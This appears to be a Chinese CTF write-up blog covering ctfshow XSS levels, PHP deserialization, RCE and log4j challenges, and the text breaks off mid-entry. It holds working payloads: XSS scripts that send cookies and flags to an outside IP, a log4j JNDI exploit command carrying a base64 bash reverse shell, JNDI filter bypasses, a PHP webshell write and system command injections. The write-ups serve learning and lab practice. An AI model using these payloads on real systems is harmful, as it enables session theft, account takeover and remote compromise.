class="string">&#x27;http://124.222.115.141/a.php?cookie=&#x27;</span>+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>之后在服务器上看到管理员cookie<br>利用cookie进入管理员页面<br>之后发现会出现跳闪，利用bp抓包一步一步的放包即可得到flag</p><h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>方法同上，能得到cookie但是还是访问不了页面</p><p>原因是，管理员访问了页面就退出了，相当于现在得到的最新cookie是管理员上一次用的cookie</p><p>这里不行了呀这里，看了下wp是用js</p><p>这样，看视频<a href="https://www.bilibili.com/video/BV1gi4y1A76p">bili</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value.innerHTML.indexOf(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">        window.location.href=<span class="string">&#x27;http://124.222.115.141/a.php?cookie=&#x27;</span>+value.innerHTML; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（ctfshow中间有+号，是因为防止把自己写的js给发送过去）<br>这样可以得到管理员密码<br>或者在show后加{可得到flag</p><h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><p>本题利用上一题的做法无法实现<br>经过观察，发现存在修改密码，经测试，可以发现可以修改admin的密码<br>利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>（注意要将该js放在用户名中进行利用）<br>之后登录admin得到flag</p><h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><p>本题和上一题相似<br>但本题是POST传参<br>看源码得到<br><img src="https://img-blog.csdnimg.cn/9b42d1a9da8d4df396c34684765e34c2.png" alt="在这里插入图片描述"><br>于是制作js修改管理员密码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;123&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>之后登录的到flag</p><h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><p>打开题目后，发现可以买flag<br>向admin转账，-10000，发现自己账号金币有10000多可以购买flag</p><h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><p>（由于后台逻辑错误，导致转金币可以不消耗自己的金币）<br>不停给自己转金币，只要不超过自己的余额就一直转，直到得到flag</p><p>也可以创建一个账号，利用js漏洞让管理员给自己转金币<br>paylaod</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/amount.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">u</span>:<span class="string">&#x27;111&#x27;</span>,<span class="attr">a</span>:<span class="string">&#x27;10000&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>FilesystemIterator类读目录的一道师傅出的题</title>
      <link href="/2022/02/19/FilesystemIterator%20%E7%B1%BB%E8%AF%BB%E7%9B%AE%E5%BD%95%E7%9A%84%E4%B8%80%E9%81%93%E5%B8%88%E5%82%85%E5%87%BA%E7%9A%84%E9%A2%98/"/>
      <url>/2022/02/19/FilesystemIterator%20%E7%B1%BB%E8%AF%BB%E7%9B%AE%E5%BD%95%E7%9A%84%E4%B8%80%E9%81%93%E5%B8%88%E5%82%85%E5%87%BA%E7%9A%84%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par4</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par0</span>,<span class="variable">$par1</span>,<span class="variable">$par2</span>,<span class="variable">$par3</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par0 = <span class="variable">$par0</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par1 = <span class="variable">$par1</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par2 = <span class="variable">$par2</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par3 = <span class="variable">$par3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newOne</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par4 = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;par0(<span class="keyword">$this</span> -&gt; par1,<span class="keyword">$this</span> -&gt; par2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">yigei</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Plz  &#x27;</span>.<span class="keyword">$this</span> -&gt; par4.<span class="string">&#x27;  try harder&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">giao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par4 -&gt; juts_a_function();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span> -&gt; par0) &amp;&amp; (<span class="keyword">isset</span>(<span class="keyword">$this</span> -&gt; par1) || <span class="keyword">isset</span>(<span class="keyword">$this</span> -&gt; par2)))&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; newOne();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span> -&gt; par3 === <span class="string">&#x27;unserialize&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span> -&gt; yigei();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span> -&gt; giao();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="keyword">$this</span> -&gt; par2.<span class="string">&#x27;hint.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>首先有个 hint.php 在__wakeup 中，直接 php 伪协议拼接读取<br><img src="https://img-blog.csdnimg.cn/3daa29b2f4e34e199d00e85dbe019650.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到提示<br><img src="https://img-blog.csdnimg.cn/ab2dda6e4f194953a54d1903b778a042.png" alt="在这里插入图片描述"><br>之后利用<br><img src="https://img-blog.csdnimg.cn/057fab99be86486f90c35cb887fa5e7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>做poc<br><img src="https://img-blog.csdnimg.cn/1e44d4552fd745f682327f9bed2d85d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现下面没啥重要的<br>经师傅提醒<br>利用glob协议<br><img src="https://img-blog.csdnimg.cn/06ed7adf94f947b19e0a5273182b6ca6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到在flll44ggg-secret.txt<br>访问得到<br><img src="https://img-blog.csdnimg.cn/84b10b72b44544a18376644eb6697d7a.png" alt="在这里插入图片描述"><br><a href="http://blog.m1kael.cn/index.php/archives/12/">PHP内置类关于反序列化的应用</a><br><a href="https://www.xiinnn.com/article/5ba4634b.html">【POP链&amp;原生类&amp;伪协议】记一道2021浙江省赛的Web题</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>长安“战疫”网络安全卫士守护赛</title>
      <link href="/2022/02/18/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/"/>
      <url>/2022/02/18/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="RCE-No-Par"><a href="#RCE-No-Par" class="headerlink" title="RCE_No_Par"></a>RCE_No_Par</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一篇相识的博客<br><a href="https://www.jianshu.com/p/7355a5ab4822">相似的博客</a><br>从中发现本题是博客中的那题的升级<br>由于/session|end|next|header|dir这些都被ban，则找替换<br>发现end可由pos(array_reverse())替换，则<br>paylaod</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(pos(array_reverse(current(get_defined_vars()))));&amp;b=phpinfo();</span><br></pre></td></tr></table></figure><h2 id="西安加油"><a href="#西安加油" class="headerlink" title="西安加油"></a>西安加油</h2><p>下载文档得到文件<br>利用whireshark打开<br>导出http对象，发现secret.txt文件<br>打开得到<br><img src="https://img-blog.csdnimg.cn/32758d5addaf44b98641cf534cb24e41.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后base64解密得到zip文件，解压得到<br><img src="https://img-blog.csdnimg.cn/d739be0e76ab40e5a11764f0a798c3ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后进行拼接得到<br><img src="https://img-blog.csdnimg.cn/dd49dac2866845fda38bb637e9d93d94.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="web-Shiro"><a href="#web-Shiro" class="headerlink" title="web Shiro?"></a>web Shiro?</h2><p>就是log4j，过滤了一下jndi<br>参考<a href="https://le1a.gitee.io/posts/3e4e56bc/">log4j</a><br>我的是利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|bash&quot;</span> -A <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">注意:根据自身情况调整payload</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于没有服务器所以之后没做<br>详细操作参考（与上面不一样，下面较详细）<br><a href="https://blog.csdn.net/weixin_43895765/article/details/121943404">log4j</a><br>值得注意的是jndi得过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">绕过jndi</span><br><span class="line"></span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:<span class="comment">//101.34.46.94:1099/sv7c8c&#125;</span></span><br><span class="line"></span><br><span class="line">&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:<span class="comment">//101.34.46.94:1099/sv7c8c&#125;</span></span><br></pre></td></tr></table></figure><p>上述两种看情况使用<br>最后反弹shell得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow新春欢乐赛</title>
      <link href="/2022/02/18/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
      <url>/2022/02/18/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h2><p>开局看到源码，但是却没有显示源码的代码。那么只能是被包含进去了，直接phpinfo搜prepend可以看到包含的文件，查看之得到flag。<br><img src="https://img-blog.csdnimg.cn/893ec64d0beb4ba39a35cee10c025a1d.png" alt="在这里插入图片描述"><br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=system(<span class="string">&quot;tac /etc/ssh/secret/youneverknow/secret.php&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[content];</span><br><span class="line">file_put_contents(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ctf-死亡exit绕过"><a href="#ctf-死亡exit绕过" class="headerlink" title="ctf 死亡exit绕过"></a><a href="https://blog.csdn.net/njqfb/article/details/117574395">ctf 死亡exit绕过</a></h2><h2 id="title-ctfshow新春欢乐赛"><a href="#title-ctfshow新春欢乐赛" class="headerlink" title="title: ctfshow新春欢乐赛"></a>title: ctfshow新春欢乐赛</h2><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(count(<span class="variable">$_POST</span>)===<span class="number">1</span>)&#123;</span><br><span class="line">        extract(<span class="variable">$_POST</span>);</span><br><span class="line">        <span class="keyword">if</span> (call_user_func($$$$$$&#123;key(<span class="variable">$_POST</span>)&#125;)===<span class="string">&quot;HappyNewYear&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用session修改变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Body</span><br><span class="line">session_id=session_id</span><br><span class="line">Cookie</span><br><span class="line">PHPSESSID=HappyNewYear</span><br></pre></td></tr></table></figure><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-01-16 15:42:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-01-24 22:14:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$key</span>=  call_user_func((<span class="variable">$_GET</span>[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span>==<span class="string">&quot;HappyNewYear&quot;</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;虎年大吉，新春快乐！&quot;</span>);</span><br></pre></td></tr></table></figure><p>弱类型比较，布尔值和任意字符串弱相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=session_start</span><br><span class="line"><span class="number">1</span>=json_last_error</span><br></pre></td></tr></table></figure><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-01-16 15:42:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-01-24 22:14:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span>=  call_user_func((<span class="variable">$_GET</span>[<span class="number">1</span>]));</span><br><span class="line">file_put_contents(<span class="variable">$key</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;虎年大吉，新春快乐！&quot;</span>);</span><br></pre></td></tr></table></figure><p>需要写入一句话木马，那么$key的值应该为php后缀文件<br>寻找调用返回php后缀的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>= spl_autoload_extensions</span><br><span class="line"><span class="comment">//之后进入.inc,.php</span></span><br><span class="line"><span class="number">1</span>=system(<span class="string">&quot;cat /f*&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>预期解为发送超长字符致使php内存溢出，非预期是竞争。<br>发送大量的hu即可通过替换实现内存占用放大，超过php最大默认内存256M即可造成变量定义失败，出现致命错误从而跳过后面的覆盖写入。<br>一个 hu 替换128 kB<br>准确计算： 256 * 1024 *1024 / 128 / 1024 = 2097152 个，用python生成下即可<br>发送过多服务器会报错o(╥﹏╥)o<br>用burp传进去，然后访问 /🐯 下载文件即可得到flag</p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>之后的不太会，看大佬博客<br><a href="https://blog.csdn.net/Little_jcak/article/details/122819006">大佬博客</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hgame 2022</title>
      <link href="/2022/02/18/Hello%20Hgame%202022/"/>
      <url>/2022/02/18/Hello%20Hgame%202022/</url>
      
        <content type="html"><![CDATA[<h2 id="web蛛蛛…嘿嘿♥我的蛛蛛"><a href="#web蛛蛛…嘿嘿♥我的蛛蛛" class="headerlink" title="web蛛蛛…嘿嘿♥我的蛛蛛"></a>web蛛蛛…嘿嘿♥我的蛛蛛</h2><p>本题进入题目后，根据题目到达第100关，对提示进行抓包，在回复中得到flag</p><h2 id="webTetris-plus"><a href="#webTetris-plus" class="headerlink" title="webTetris plus"></a>webTetris plus</h2><p>本题打开页面，是个游戏，可以F12，之后搜索alert<br><img src="https://img-blog.csdnimg.cn/1619019c2f56423c8da4ccae96940cc8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在check.js中的alert下面有jsfuck加密<br>在控制台上解密得到flag</p><h2 id="webeasy-auth"><a href="#webeasy-auth" class="headerlink" title="webeasy_auth"></a>webeasy_auth</h2><p>标题auth提示是鉴权方面的问题，描述中的“没有调试完”说明存在弱密码之类的问问题。问题出在前后后端交互的token中<br>首先正常注册并登录自己的账号，获得自己的token<br><img src="https://img-blog.csdnimg.cn/0fbc2d34a505494eb3801db04b9686f9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>前往jwt解析工具进行解析，，对taken进行jwt解密<br><img src="https://img-blog.csdnimg.cn/f5f5b153050543639143c42b7c54f407.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后将id和token进行修改，改为1和admin<br><img src="https://img-blog.csdnimg.cn/7d02c9a493cf4acf8cd2af66923a7ae4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>放入本地存储空间，修改后刷新得到flag<br><img src="https://img-blog.csdnimg.cn/5e33cf3d0f1943c0aa9632ee167c4de3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="misc好康的流量"><a href="#misc好康的流量" class="headerlink" title="misc好康的流量"></a>misc好康的流量</h2><p>附件为wireshark流量文件<br>大概能看出流量内容为一封邮件<br>使用wireshark的 导出SMB对象 即可导出邮件内容<br>PS：部分wireshark因为版本问题无法识别 使用追踪tcp流 然后base64解码 获得邮件内容<br>结合邮件中的LSB内容<br>判断是LSB隐写<br>扫描得到前半段flag<br><img src="https://img-blog.csdnimg.cn/6cb68965309f4155be7d4e2ff768c4e3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得后半段<br><img src="https://img-blog.csdnimg.cn/3818672e03194c17a9f7dcda31c2df0f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="webpack-engine"><a href="#webpack-engine" class="headerlink" 